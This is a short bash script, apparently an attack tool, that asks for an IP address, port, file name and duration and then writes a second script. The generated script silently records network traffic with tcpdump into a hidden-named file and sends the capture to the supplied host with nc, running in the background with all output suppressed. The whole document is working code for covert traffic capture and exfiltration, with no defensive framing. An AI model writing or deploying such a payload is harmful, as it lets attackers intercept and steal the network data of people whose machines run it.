#!/bin/bash
clear
read -p "enter your ip : " ip
#if [[ $tIp =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
#	break
#fi
read -p "enter the port for send file : " port
read -p "enter the captureData name (.sh): " name
read -p "enter the time for recive (Second) : " rTime

cat << EOF > ./$name
#!/bin/bash

        {
        timeout $rTime tcpdump -w  ./..1
        nc -w 3 $ip $port < ./..1
        } > /dev/null 2>&1 &
EOF
